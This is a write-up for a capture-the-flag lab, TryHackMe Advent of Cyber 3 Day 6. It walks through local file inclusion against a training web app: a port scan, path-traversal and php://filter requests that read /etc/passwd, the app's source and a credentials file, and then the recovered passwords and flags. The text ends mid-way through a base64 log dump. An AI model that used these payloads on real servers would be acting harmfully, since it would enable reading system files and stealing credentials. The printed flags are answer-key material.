# TryHackMe [Advent of Cyber 3](https://tryhackme.com/room/adventofcyber3) Day 6

### References

-   HuskyHacks. (2021). Late-Twenties Boomer Performs LFI & Log Poisoning (elf hat) | TryHackMe Advent of Cyber Day 6! [YouTube Video]. In YouTube. https://youtu.be/pGPE5uCI5h8

```bash
$ nmap -sC -sV -vv <MACHINE_IP>
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 97:51:86:27:95:38:b2:87:3b:c6:8f:ee:7f:c0:43:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKL515Sr56383mOqOWTbUPzRkPxBcYhDv1KNUZuRPn5p/msrn2KlDoWMYtZAo5EAFcHsbe2FhLzIS6l+bdGGOK+VIrD1qycpsslzx+YALZDunJG3rl4PPCDVQmx8qzm5UoyPK88gJjaV7Sgr0IFhcjnPsuTy0keUDcTNfFNvwSfCYxGENx3N9D0FQFW09vb9MZ4Y4wgY/9Xu+gyCgcmewGh3t1OMKW3QaQP7UEkJZhWnjfhSe/JyxWAhXBNOxX/lac2u4tM05siUib1AgI/GdqRgmfuCEn27Zb4JxuFQw7kwZvRzodbwn2GvZK+dm52LPWezRWnlO60heMdHaj4aKZ
|   256 e4:57:c6:13:68:76:ee:f8:4a:c3:e7:32:da:3f:88:fe (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHrT4Yx3D4wesPgaMFcypTG2KO3I/V5rR0d1BgArMcK9ChWnjXAoJX369iiS5V5S8QqR+jgXvawoOUTXWNjXXbs=
|   256 8f:35:1d:c3:7f:2f:94:b9:b0:37:88:5f:a4:27:b0:01 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMPLEnk/fMmIl48HKA3MvRRE+3hXXPWMDdz8dPZe2+3W
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-title: Site does not have a title (text/html).
|_Requested resource was index.php?err=error.txt
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`curl "http://<MACHINE_IP>/index.php?err=../../../etc/passwd"`

```html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8" />
		<title></title>

		<!-- Bootstrap core CSS -->
		<link href="./css/bootstrap.min.css" rel="stylesheet" />

		<!-- Custom Stylesheet -->
		<link href="./css/style.css" rel="stylesheet" />

		<!-- Core libraries bootstrap & jquery -->
		<script src="./js/bootstrap5.min.js"></script>
		<script src="./js/jquery-3.6.0.min.js"></script>

		<!-- Custom JS code -->
		<script src="./js/script.js"></script>
	</head>

	<header>
		<div class="container">
			<ul class="nav">
				<li class="nav-item">
					<a class="nav-link" href="./index.php">Home</a>
				</li>
				<li class="nav-item">
					<a class="nav-link">/</a>
				</li>
				<li class="nav-item">
					<a class="nav-link active"></a>
				</li>
			</ul>
		</div>
	</header>
	<body>
		<div class="container" style="padding-top: 5%;">
			<img
				src="./img/xmas_tree.png"
				class="mx-auto d-block"
				width="200"
				height="300"
			/>
			<h1 class="display-4">McSys Control System</h1>
			<p class="lead">
				Note from McSys Control System: The access to this web app is
				limited!
			</p>
			<hr class="my-4" />

			<p></p>

			<div class="row">
				<div class="col-lg-12"></div>
				<div class="col-lg-8 col-offset-1">
					<p>Welcome Guest</p>
					<div class="alert alert-danger" role="alert">
						This server has sensitive information. Note All actions
						to this server are logged in!
					</div>
				</div>
				root:x:0:0:root:/root:/bin/bash
				daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh
				sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync
				games:x:5:60:games:/usr/games:/bin/sh
				man:x:6:12:man:/var/cache/man:/bin/sh
				lp:x:7:7:lp:/var/spool/lpd:/bin/sh
				mail:x:8:8:mail:/var/mail:/bin/sh
				news:x:9:9:news:/var/spool/news:/bin/sh
				uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
				proxy:x:13:13:proxy:/bin:/bin/sh
				www-data:x:33:33:www-data:/var/www:/bin/sh
				backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing
				List Manager:/var/list:/bin/sh
				irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats
				Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
				nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
				libuuid:x:100:101::/var/lib/libuuid:/bin/sh
				mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false
			</div>
		</div>
	</body>
</html>
```

## Deploy the attached VM and look around. What is the entry point for our web application?

-   The web page defaults to reading from `$(pwd)/error.txt`, because when requesting the root page of the website, the server redirects to `http://<MACHINE_IP>/index.php?err=error.txt`.

**Answer**: `err`

## Use the entry point to perform `LFI` to read the `/etc/flag` file. What is the flag?

`curl "http://<MACHINE_IP>/index.php?err=../../../etc/flag"`

```html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8" />
		<title></title>

		<!-- Bootstrap core CSS -->
		<link href="./css/bootstrap.min.css" rel="stylesheet" />

		<!-- Custom Stylesheet -->
		<link href="./css/style.css" rel="stylesheet" />

		<!-- Core libraries bootstrap & jquery -->
		<script src="./js/bootstrap5.min.js"></script>
		<script src="./js/jquery-3.6.0.min.js"></script>

		<!-- Custom JS code -->
		<script src="./js/script.js"></script>
	</head>

	<header>
		<div class="container">
			<ul class="nav">
				<li class="nav-item">
					<a class="nav-link" href="./index.php">Home</a>
				</li>
				<li class="nav-item">
					<a class="nav-link">/</a>
				</li>
				<li class="nav-item">
					<a class="nav-link active"></a>
				</li>
			</ul>
		</div>
	</header>
	<body>
		<div class="container" style="padding-top: 5%;">
			<img
				src="./img/xmas_tree.png"
				class="mx-auto d-block"
				width="200"
				height="300"
			/>
			<h1 class="display-4">McSys Control System</h1>
			<p class="lead">
				Note from McSys Control System: The access to this web app is
				limited!
			</p>
			<hr class="my-4" />

			<p></p>

			<div class="row">
				<div class="col-lg-12"></div>
				<div class="col-lg-8 col-offset-1">
					<p>Welcome Guest</p>
					<div class="alert alert-danger" role="alert">
						This server has sensitive information. Note All actions
						to this server are logged in!
					</div>
				</div>
				THM{d29e08941cf7fe41df55f1a7da6c4c06}
			</div>
		</div>
	</body>
</html>
```

**Flag**: `THM{d29e08941cf7fe41df55f1a7da6c4c06}`

## Use the PHP filter technique to read the source code of the `index.php`. What is the `$flag` variable's value?

-   `curl "http://<MACHINE_IP>/index.php?err=php://filter/convert.base64-encode/resource=index.php"`

```html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8" />
		<title></title>

		<!-- Bootstrap core CSS -->
		<link href="./css/bootstrap.min.css" rel="stylesheet" />

		<!-- Custom Stylesheet -->
		<link href="./css/style.css" rel="stylesheet" />

		<!-- Core libraries bootstrap & jquery -->
		<script src="./js/bootstrap5.min.js"></script>
		<script src="./js/jquery-3.6.0.min.js"></script>

		<!-- Custom JS code -->
		<script src="./js/script.js"></script>
	</head>

	<header>
		<div class="container">
			<ul class="nav">
				<li class="nav-item">
					<a class="nav-link" href="./index.php">Home</a>
				</li>
				<li class="nav-item">
					<a class="nav-link">/</a>
				</li>
				<li class="nav-item">
					<a class="nav-link active"></a>
				</li>
			</ul>
		</div>
	</header>
	<body>
		<div class="container" style="padding-top: 5%;">
			<img
				src="./img/xmas_tree.png"
				class="mx-auto d-block"
				width="200"
				height="300"
			/>
			<h1 class="display-4">McSys Control System</h1>
			<p class="lead">
				Note from McSys Control System: The access to this web app is
				limited!
			</p>
			<hr class="my-4" />

			<p></p>

			<div class="row">
				<div class="col-lg-12"></div>
				<div class="col-lg-8 col-offset-1">
					<p>Welcome Guest</p>
					<div class="alert alert-danger" role="alert">
						This server has sensitive information. Note All actions
						to this server are logged in!
					</div>
				</div>
				PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8+CjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICA8L2Rpdj4KICA8ZGl2IGNsYXNzPSJjb2wtbGctOCBjb2wtb2Zmc2V0LTEiPgogICAgICA8P3BocCBpZiAoaXNzZXQoJGVycm9yKSkgeyA/PgogICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQgdGV4dC1kYW5nZXIiPjxiPjw/cGhwIGVjaG8gJGVycm9yOyA/PjwvYj48L3NwYW4+CiAgICAgIDw/cGhwIH0KCj8+CiA8cD5XZWxjb21lIDw/cGhwIGVjaG8gZ2V0VXNlck5hbWUoKTsgPz48L3A+Cgk8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiIHJvbGU9ImFsZXJ0Ij5UaGlzIHNlcnZlciBoYXMgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLiBOb3RlIEFsbCBhY3Rpb25zIHRvIHRoaXMgc2VydmVyIGFyZSBsb2dnZWQgaW4hPC9kaXY+IAoJPC9kaXY+Cjw/cGhwIGlmKCRlcnJJbmNsdWRlKXsgaW5jbHVkZSgkX0dFVFsnZXJyJ10pO30gPz4KPC9kaXY+Cgo8P3BocAp9Cj8+
			</div>
		</div>
	</body>
</html>
```

```bash
$ echo "PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8+CjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICA8L2Rpdj4KICA8ZGl2IGNsYXNzPSJjb2wtbGctOCBjb2wtb2Zmc2V0LTEiPgogICAgICA8P3BocCBpZiAoaXNzZXQoJGVycm9yKSkgeyA/PgogICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQgdGV4dC1kYW5nZXIiPjxiPjw/cGhwIGVjaG8gJGVycm9yOyA/PjwvYj48L3NwYW4+CiAgICAgIDw/cGhwIH0KCj8+CiA8cD5XZWxjb21lIDw/cGhwIGVjaG8gZ2V0VXNlck5hbWUoKTsgPz48L3A+Cgk8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiIHJvbGU9ImFsZXJ0Ij5UaGlzIHNlcnZlciBoYXMgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLiBOb3RlIEFsbCBhY3Rpb25zIHRvIHRoaXMgc2VydmVyIGFyZSBsb2dnZWQgaW4hPC9kaXY+IAoJPC9kaXY+Cjw/cGhwIGlmKCRlcnJJbmNsdWRlKXsgaW5jbHVkZSgkX0dFVFsnZXJyJ10pO30gPz4KPC9kaXY+Cgo8P3BocAp9Cj8+" | base64 -d
```

```php
<?php session_start();
$flag = "THM{791d43d46018a0d89361dbf60d5d9eb8}";
include("./includes/creds.php");
if($_SESSION['username'] === $USER){
	header( 'Location: manage.php' );
	die();
} else {
	$labNum = "";
	require "./includes/header.php";
?>
<div class="row">
	<div class="col-lg-12"></div>
	<div class="col-lg-8 col-offset-1">
		<?php if (isset($error)) { ?>
			<span class="text text-danger"><b><?php echo $error; ?></b></span>
		<?php } ?>
		<p>Welcome <?php echo getUserName(); ?></p>
		<div class="alert alert-danger" role="alert">This server has sensitive information. Note All actions to this server are logged in!</div>
	</div>
	<?php if($errInclude){ include($_GET['err']);} ?>
</div>
<?php } ?>
```

**Flag**: `THM{791d43d46018a0d89361dbf60d5d9eb8}`

## Now that you read the `index.php`, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?
```
$ curl "http://<MACHINE_IP>/index.php?err=php://filter/convert.base64-encode/resource=includes/creds.php"<!doctype html><html lang="en">  <head>
    <meta charset="utf-8">
    <title></title>


    <!-- Bootstrap core CSS -->
    <link href="./css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Stylesheet -->
    <link href="./css/style.css" rel="stylesheet">

    <!-- Core libraries bootstrap & jquery -->
    <script src="./js/bootstrap5.min.js"></script>
    <script src="./js/jquery-3.6.0.min.js"></script>

    <!-- Custom JS code -->
    <script src="./js/script.js"></script>

  </head>

    <header>
<div class="container">
  <ul class="nav">
        <li class="nav-item">
                <a class="nav-link" href="./index.php">Home</a>
        </li>
        <li class="nav-item">
                <a class="nav-link">/</a>
        </li>
        <li class="nav-item">
        <a class="nav-link active" ></a>
        </li>
  </ul>
</div>
    </header>
<body>
  <div class="container" style="padding-top: 5%;">
        <img src="./img/xmas_tree.png" class="mx-auto d-block" width="200" height="300">
      <h1 class="display-4">McSys Control System</h1>
      <p class="lead">Note from McSys Control System: The access to this web app is limited!
<hr class="my-4">

<p></p>


<div class="row">
  <div class="col-lg-12">
  </div>
  <div class="col-lg-8 col-offset-1">
       <p>Welcome Guest</p>
        <div class="alert alert-danger" role="alert">This server has sensitive information. Note All actions to this server are logged in!</div> 
        </div>
PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/</div>
```

```
$ echo "PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo" | base64 -d
<?php 
$USER = "McSkidy";
$PASS = "A0C315Aw3s0m";
base64: invalid input
```

**Answer**: `McSkidy:A0C315Aw3s0m`
## Use the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the `flag.thm.aoc` server?
1. Login with credetials
2. Click on the **Password Recovery** link (`http://<MACHINE_IP>/recover-password.php`)

* Server Name: **`web.thm.aoc`** - Password: **`pass123`**
* Server Name: **`ftp.thm.aoc`** - Password: **`123321`**
* Server Name: **`flag.thm.aoc`** - Password: **`THM{552f313b52e3c3dbf5257d8c6db7f6f1}`**

**Flag**: `THM{552f313b52e3c3dbf5257d8c6db7f6f1}`
## The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at `./includes/logs/app_access.log`.

```bash
$ curl "http://<MACHINE_IP>/index.php?err=php://filter/convert.base64-encode/resource=includes/logs/app_access.log"
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title></title>


    <!-- Bootstrap core CSS -->
    <link href="./css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Stylesheet -->
    <link href="./css/style.css" rel="stylesheet">

    <!-- Core libraries bootstrap & jquery -->
    <script src="./js/bootstrap5.min.js"></script>
    <script src="./js/jquery-3.6.0.min.js"></script>

    <!-- Custom JS code -->
    <script src="./js/script.js"></script>

  </head>

    <header>
<div class="container">
  <ul class="nav">
        <li class="nav-item">
                <a class="nav-link" href="./index.php">Home</a>
        </li>
        <li class="nav-item">
                <a class="nav-link">/</a>
        </li>
        <li class="nav-item">
        <a class="nav-link active" ></a>
        </li>
  </ul>
</div>
    </header>
<body>
  <div class="container" style="padding-top: 5%;">
        <img src="./img/xmas_tree.png" class="mx-auto d-block" width="200" height="300">
      <h1 class="display-4">McSys Control System</h1>
      <p class="lead">Note from McSys Control System: The access to this web app is limited!
<hr class="my-4">

<p></p>


<div class="row">
  <div class="col-lg-12">
  </div>
  <div class="col-lg-8 col-offset-1">
       <p>Welcome Guest</p>
        <div class="alert alert-danger" role="alert">This server has sensitive information. Note All actions to this server are logged in!</div> 
        </div>
Ck1jU2tpZHk6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTUuMC40NjM4LjY5IFNhZmFyaS81MzcuMzY6L21hbmFnZS5waHAKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTUuMC40NjM4LjY5IFNhZmFyaS81MzcuMzY6L2luZGV4LnBocD9lcnI9ZXJyb3IudHh0Ckd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk1LjAuNDYzOC42OSBTYWZhcmkvNTM3LjM2Oi9pbmRleC5waHA/ZXJyPS9ldGMvZmxhZwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgU2FmYXJpLzUzNy4zNjovaW5kZXgucGhwP2Vycj1lcnJvci50eHQKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgU2FmYXJpLzUzNy4zNjovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTYuMC40NjY0LjQ1IFNhZmFyaS81MzcuMzY6L2luZGV4LnBocD9lcnI9ZXJyb3IudHh0Ckd1ZXN0OjE3Mi4xNy4wLjE6Oi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTo6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6L2luZGV4LnBocD9lcnI9ZXJyb3IudHh0Ckd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE5tYXAgU2NyaXB0aW5nIEVuZ2luZTsgaHR0cHM6Ly9ubWFwLm9yZy9ib29rL25zZS5odG1sKTovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE5tYXAgU2NyaXB0aW5nIEVuZ2luZTsgaHR0cHM6Ly9ubWFwLm9yZy9ib29rL25zZS5odG1sKTovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE5tYXAgU2NyaXB0aW5nIEVuZ2luZTsgaHR0cHM6Ly9ubWFwLm9yZy9ib29rL25zZS5odG1sKTovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE5tYXAgU2NyaXB0aW5nIEVuZ2luZTsgaHR0cHM6Ly9ubWFwLm9yZy9ib29rL25zZS5odG1sKTovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE5tYXAgU2NyaXB0aW5nIEVuZ2luZTsgaHR0cHM6Ly9ubWFwLm9yZy9ib29rL25zZS5odG1sKTovaW5kZXgucGhwP2Vycj1lcnJvci50eHQKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTo6LwpHdWVzdDoxNzIuMTcuMC4xOjovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo3OC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzc4LjA6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/ZXJyPWVycm9yLnR4dApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/ZXJyPWVycm9yLnR4dApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/ZXJyPS4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2Ojc4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNzguMDovaW5kZXgucGhwP2Vycj0uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo3OC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzc4LjA6L2luZGV4LnBocD9lcnI9Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/ZXJyPS4uLy4uLy4uL2V0Yy9wYXNzd2QKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2Ojc4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNzguMDovaW5kZXgucGhwP2Vycj0uLi8uLi9ldGMvcGFzc3dkCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo3OC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzc4LjA6L2luZGV4LnBocD9lcnI9Li4vLi4vLi4vZXRjL3Bhc3N3ZApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/ZXJyPS4uLy4uLy4uL2V0Yy9wYXNzd2QKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2Ojc4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNzguMDovaW5kZXgucGhwP2Vycj0uLi8uLi8uLi9ldGMvZmxhZwpHdWVzdDoxNzIuMTcuMC4xOmN1cmwvNy44MC4wOi9pbmRleC5waHA/ZXJyPXBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9aW5kZXgucGhwCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvb